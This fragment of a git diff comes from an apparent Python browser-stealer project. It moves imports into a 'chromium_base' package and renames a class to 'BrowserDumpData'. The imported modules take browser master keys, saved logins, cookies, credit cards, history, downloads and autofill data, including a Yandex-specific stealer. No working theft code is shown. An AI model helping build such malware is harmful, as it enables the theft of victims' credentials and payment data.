@@ -4,18 +4,20 @@ import psutil
 
 # ------------------------------------------------------
 # import functions from modules dir 
-from modules.Browsers.browser_paths import allBrowsersPath
-from modules.Browsers.get_masterkey import GetMasterKey
-from modules.Browsers.login import get_login_data
-from modules.Browsers.cookier import get_cookies
-from modules.Browsers.creadits import get_credit_cards
-from modules.Browsers.history import get_web_history
-from modules.Browsers.downloads import get_downloads
-from modules.Browsers.auto_fill import steal_auto_fill
+from modules.Browsers.chromium_base.browser_paths import allBrowsersPath
+from modules.Browsers.chromium_base.get_masterkey import GetMasterKey
+from modules.Browsers.chromium_base.login import get_login_data
+from modules.Browsers.chromium_base.cookier import get_cookies
+from modules.Browsers.chromium_base.creadits import get_credit_cards
+from modules.Browsers.chromium_base.history import get_web_history
+from modules.Browsers.chromium_base.downloads import get_downloads
+from modules.Browsers.chromium_base.auto_fill import steal_auto_fill
 # ------------------------------------------------------
 from modules.Browsers.yandex.yandex_browser_data import YandexStealData
 
-class Walkthrough:
+
+
+class BrowserDumpData:
     def __init__(self, king_folder):
         self.king_folder: str = king_folder
         self.king_folder_: str = os.path.join(king_folder, 'Browser Data')
